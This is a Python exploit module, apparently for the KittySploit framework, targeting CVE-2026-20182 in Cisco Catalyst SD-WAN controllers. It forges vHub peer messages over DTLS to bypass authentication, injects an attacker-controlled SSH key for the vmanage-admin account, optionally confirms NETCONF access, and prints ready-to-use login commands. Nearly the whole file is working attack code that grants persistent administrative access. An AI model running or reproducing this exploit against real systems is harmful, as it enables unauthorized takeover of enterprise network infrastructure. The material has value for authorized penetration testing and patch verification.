#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import shutil
import struct
import subprocess
import tempfile
import time
from typing import Optional, Tuple

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


class Module(Auxiliary, Tcp_scanner_client):
    __info__ = {
        "name": "Cisco Catalyst SD-WAN CVE-2026-20182 vHub auth bypass",
        "description": (
            "CVE-2026-20182: Cisco Catalyst SD-WAN Controller/Manager vdaemon (DTLS UDP/12346) "
            "skips certificate verification for peers claiming to be a vHub (device_type=2). "
            "This module bypasses peering authentication, injects an SSH public key into the "
            "vmanage-admin authorized_keys file, and optionally verifies NETCONF access on TCP/830."
        ),
        "author": ["Stephen Fewer", "Jonah Burgess (Rapid7)", "KittySploit Team"],
        "cve": ["CVE-2026-20182"],
        "references": [
            "https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-rpa2-v69WY2SW.html",
            "https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-20182",
            "https://www.rapid7.com/db/modules/auxiliary/admin/networking/cisco_sdwan_vhub_auth_bypass/",
        ],
        "tags": [
            "cisco",
            "sd-wan",
            "vdaemon",
            "vsmart",
            "vmanage",
            "dtls",
            "auth-bypass",
            "netconf",
            "unauthenticated",
            "cve-2026-20182",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "credential_access", "persistence"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals", "credentials"],
            "cost": 2.0,
            "noise": 0.5,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["cisco", "sd-wan", "vmanage", "vsmart"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": ""},
                    {"capability": "admin_access", "from_detail": "netconf"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    MSG_CHALLENGE = 8
    MSG_CHALLENGE_ACK = 9
    MSG_CHALLENGE_ACK_ACK = 10
    MSG_HELLO = 5
    MSG_VMANAGE_TO_PEER = 14

    DEVICE_TYPE_VHUB = 2
    DEVICE_TYPE_VSMART = 3

    port = OptPort(12346, "vdaemon DTLS UDP port", True)
    pubkey_file = OptString(
        "",
        "Existing SSH public key to inject (generates ephemeral key when empty)",
        required=False,
    )
    private_key_file = OptString(
        "",
        "Path to write generated private key (temp file when empty)",
        required=False,
        advanced=True,
    )
    verify_netconf = OptBool(
        False,
        "Verify access via NETCONF SSH after key injection",
        required=False,
    )
    netconf_port = OptPort(830, "NETCONF SSH port", required=False, advanced=True)
    handshake_wait = OptFloat(
        2.0,
        "Seconds to wait between DTLS protocol steps",
        required=False,
        advanced=True,
    )
    dtls_connect_wait = OptFloat(
        4.0,
        "Seconds to wait after starting openssl DTLS client",
        required=False,
        advanced=True,
    )

    def _opt(self, option):
        if hasattr(option, "value"):
            return option.value
        return option

    @staticmethod
    def _make_msg(msg_type: int, device_type: int, body: bytes = b"") -> bytes:
        header = struct.pack(
            "!BBBBII",
            (1 << 4) | msg_type,
            (device_type << 4) | 0,
            0xA0,
            0,
            0,
            1,
        )
        return header + body

    def _make_challenge_ack(self) -> bytes:
        body = struct.pack("!HH", 0x0001, 8) + b"CAFEBABE"
        body += struct.pack("!HH", 0x0002, 0)
        return self._make_msg(self.MSG_CHALLENGE_ACK, self.DEVICE_TYPE_VHUB, body)

    def _make_hello(self) -> bytes:
        return self._make_msg(self.MSG_HELLO, self.DEVICE_TYPE_VHUB, b"\x00" * 4)

    def _make_ssh_key_message(self, pubkey_bytes: bytes) -> bytes:
        key_buf = b"\n" + pubkey_bytes.strip() + b"\n\x00"
        key_buf = key_buf.ljust(768, b"\x00")[:768]
        return self._make_msg(
            self.MSG_VMANAGE_TO_PEER,
            self.DEVICE_TYPE_VSMART,
            key_buf + struct.pack("!B", 0),
        )

    @staticmethod
    def _generate_ssh_keypair() -> Tuple[bytes, bytes]:
        key = rsa.generate_private_key(65537, 2048, default_backend())
        priv = key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.OpenSSH,
            serialization.NoEncryption(),
        )
        pub = key.public_key().public_bytes(
            serialization.Encoding.OpenSSH,
            serialization.PublicFormat.OpenSSH,
        )
        return priv, pub

    @staticmethod
    def _drain(proc: subprocess.Popen) -> bytes:
        data = b""
        while True:
            try:
                chunk = proc.stdout.read1(65536)
                if not chunk:
                    break
                data += chunk
            except BlockingIOError:
                break
            except Exception:
                break
        return data

    @staticmethod
    def _contains_msg_type(data: bytes, msg_type: int) -> bool:
        return any((byte & 0x0F) == msg_type for byte in data)

    def _openssl_available(self) -> bool:
        return bool(shutil.which("openssl"))

    def _dtls_session(
        self,
        host: str,
        port: int,
        pubkey: Optional[bytes] = None,
        inject_key: bool = True,
    ) -> dict:
        """
        Run the vHub auth-bypass handshake via openssl s_client DTLS.
        When inject_key is False, stop after CHALLENGE_ACK_ACK (check-only).
        """
        result = {
            "ok": False,
            "challenge": False,
            "authenticated": False,
            "up": False,
            "injected": False,
            "error": "",
        }
        if not self._openssl_available():
            result["error"] = "openssl not found in PATH"
            return result

        connect_wait = float(self._opt(self.dtls_connect_wait) or 4.0)
        step_wait = float(self._opt(self.handshake_wait) or 2.0)

        proc = subprocess.Popen(
            [
                "openssl",
                "s_client",
                "-connect",
                f"{host}:{int(port)}",
                "-dtls1_2",
                "-quiet",
            ],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        try:
            time.sleep(connect_wait)
            os.set_blocking(proc.stdout.fileno(), False)

            initial = self._drain(proc)
            if len(initial) < 12:
                result["error"] = "No data received after DTLS handshake"
                return result

            rcv_type = initial[0] & 0x0F
            if rcv_type != self.MSG_CHALLENGE:
                result["error"] = f"Expected CHALLENGE (8), got {rcv_type}"
                return result
            result["challenge"] = True

            proc.stdin.write(self._make_challenge_ack())
            proc.stdin.flush()
            time.sleep(step_wait)
            resp = self._drain(proc)

            if not self._contains_msg_type(resp, self.MSG_CHALLENGE_ACK_ACK):
                result["error"] = "No CHALLENGE_ACK_ACK (target likely patched)"
                return result
            result["authenticated"] = True

            if not inject_key:
                result["ok"] = True
                return result

            proc.stdin.write(self._make_hello())
            proc.stdin.flush()
            time.sleep(step_wait)
            self._drain(proc)
            result["up"] = True

            if not pubkey:
                result["error"] = "No public key provided for injection"
                return result

            proc.stdin.write(self._make_ssh_key_message(pubkey))
            proc.stdin.flush()
            time.sleep(step_wait)
            result["injected"] = True
            result["ok"] = True
            return result
        except Exception as exc:
            result["error"] = str(exc)
            return result
        finally:
            try:
                proc.kill()
            except Exception:
                pass

    def _resolve_pubkey(self) -> Tuple[Optional[bytes], Optional[str], Optional[str]]:
        """Return (pubkey_bytes, private_key_path_or_None, error)."""
        pubkey_path = str(self._opt(self.pubkey_file) or "").strip()
        if pubkey_path:
            try:
                with open(pubkey_path, "rb") as handle:
                    return handle.read().strip(), None, None
            except OSError as exc:
                return None, None, f"Unable to read pubkey_file: {exc}"

        priv, pub = self._generate_ssh_keypair()
        out_path = str(self._opt(self.private_key_file) or "").strip()
        if not out_path:
            fd, out_path = tempfile.mkstemp(prefix="cve-2026-20182_", suffix="_key")
            os.close(fd)
        try:
            with open(out_path, "wb") as handle:
                handle.write(priv)
            os.chmod(out_path, 0o600)
        except OSError as exc:
            return None, None, f"Unable to write private key: {exc}"
        return pub, out_path, None

    def _verify_netconf(self, host: str, private_key_path: str) -> bool:
        port = int(self._opt(self.netconf_port) or 830)
        cmd = [
            "ssh",
            "-i",
            private_key_path,
            "-o",
            "StrictHostKeyChecking=no",
            "-o",
            "UserKnownHostsFile=/dev/null",
            "-o",
            "ConnectTimeout=10",
            "-o",
            "HostKeyAlgorithms=+ssh-rsa",
            "-p",
            str(port),
            f"vmanage-admin@{host}",
        ]
        hello = (
            b'<?xml version="1.0" encoding="UTF-8"?>'
            b'<hello xmlns="urn:ietf:params:xml:ns:netconf:base:1.0">'
            b"<capabilities>"
            b"<capability>urn:ietf:params:netconf:base:1.0</capability>"
            b"</capabilities></hello>]]>]]>"
        )
        try:
            proc = subprocess.Popen(
                cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            stdout, _ = proc.communicate(input=hello, timeout=15)
            out = stdout.decode(errors="replace").lower()
            return "capabilities" in out or "hello" in out
        except Exception as exc:
            print_warning(f"NETCONF verify failed: {exc}")
            return False

    def check(self):
        host = self._host()
        if not host:
            return {"vulnerable": False, "reason": "target not set", "confidence": "low"}
        if not self._openssl_available():
            return {
                "vulnerable": False,
                "reason": "openssl binary required for DTLS transport",
                "confidence": "low",
            }

        result = self._dtls_session(host, int(self.port), inject_key=False)
        if result.get("authenticated"):
            return {
                "vulnerable": True,
                "reason": "CHALLENGE_ACK_ACK received after vHub CHALLENGE_ACK (auth bypass)",
                "confidence": "high",
            }
        if result.get("challenge"):
            return {
                "vulnerable": False,
                "reason": result.get("error") or "CHALLENGE seen but ACK_ACK missing (likely patched)",
                "confidence": "high",
            }
        return {
            "vulnerable": False,
            "reason": result.get("error") or "vdaemon DTLS probe failed",
            "confidence": "medium",
        }

    def run(self):
        host = self._host()
        if not host:
            print_error("Target host is required")
            return False
        if not self._openssl_available():
            print_error("openssl is required (openssl s_client -dtls1_2)")
            return False

        pubkey, priv_path, err = self._resolve_pubkey()
        if err:
            print_error(err)
            return False

        print_status(f"CVE-2026-20182 — targeting {host}:{int(self.port)} (vdaemon DTLS)")
        if priv_path:
            print_info(f"Ephemeral private key: {priv_path}")

        result = self._dtls_session(host, int(self.port), pubkey=pubkey, inject_key=True)
        if not result.get("challenge"):
            print_error(result.get("error") or "DTLS handshake / CHALLENGE failed")
            return False
        print_success("DTLS handshake complete (CHALLENGE received)")

        if not result.get("authenticated"):
            print_error(result.get("error") or "Authentication bypass failed")
            return False
        print_success("peer->authenticated = 1 (vHub auth bypass)")

        if not result.get("up"):
            print_error(result.get("error") or "HELLO / UP transition failed")
            return False
        print_success("Peer reached UP state")

        if not result.get("injected"):
            print_error(result.get("error") or "SSH key injection failed")
            return False
        print_success("SSH public key injected for vmanage-admin")

        if bool(self._opt(self.verify_netconf)):
            if not priv_path:
                print_warning("NETCONF verify skipped (using external pubkey_file without private key)")
            else:
                print_status(f"Verifying NETCONF on {host}:{int(self.netconf_port)} ...")
                if self._verify_netconf(host, priv_path):
                    print_success("NETCONF session established as vmanage-admin")
                else:
                    print_warning("NETCONF verification inconclusive")

        if priv_path:
            print_info(
                f"NETCONF: ssh -i {priv_path} -o HostKeyAlgorithms=+ssh-rsa "
                f"-p {int(self.netconf_port)} vmanage-admin@{host}"
            )
            print_info(
                f"SSH:     ssh -i {priv_path} -o HostKeyAlgorithms=+ssh-rsa vmanage-admin@{host}"
            )
        return True
